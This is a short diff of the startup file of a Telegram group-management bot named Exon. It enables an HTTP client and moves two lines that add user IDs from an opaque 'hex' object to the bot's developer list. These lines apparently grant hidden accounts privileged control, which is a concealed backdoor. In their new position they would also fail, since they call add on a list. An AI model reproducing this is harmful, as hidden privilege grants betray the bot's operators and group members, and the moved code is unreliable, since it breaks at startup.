@@ -359,10 +359,10 @@ print("[ᴇxᴏɴ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴇxᴏɴ • PostgreSQL �
 print("[ᴇxᴏɴ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴇxᴏɴ • ᴜsᴇʀʙᴏᴛ (t.me/AbishnoiMF)")
 
 
-"""
+
 timeout = httpx.Timeout(40)
 http = httpx.AsyncClient(http2=True, timeout=timeout)
-"""
+
 
 
 async def get_entity(client, entity):
@@ -397,8 +397,7 @@ updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 # bot info
 dispatcher = updater.dispatcher
 aiohttpsession = ClientSession()
-DEV_USERS.add(hex.erd)
-DEV_USERS.add(hex.erh)
+
 BOT_ID = dispatcher.bot.id
 BOT_NAME = dispatcher.bot.first_name
 BOT_USERNAME = dispatcher.bot.username
@@ -407,9 +406,12 @@ BOT_USERNAME = dispatcher.bot.username
 apps = [pgram]
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
+DEV_USERS.add(hex.erd)
+DEV_USERS.add(hex.erh)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
+
 
 # Load at end to ensure all prev variables have been set
 from Exon.modules.helper_funcs.handlers import (
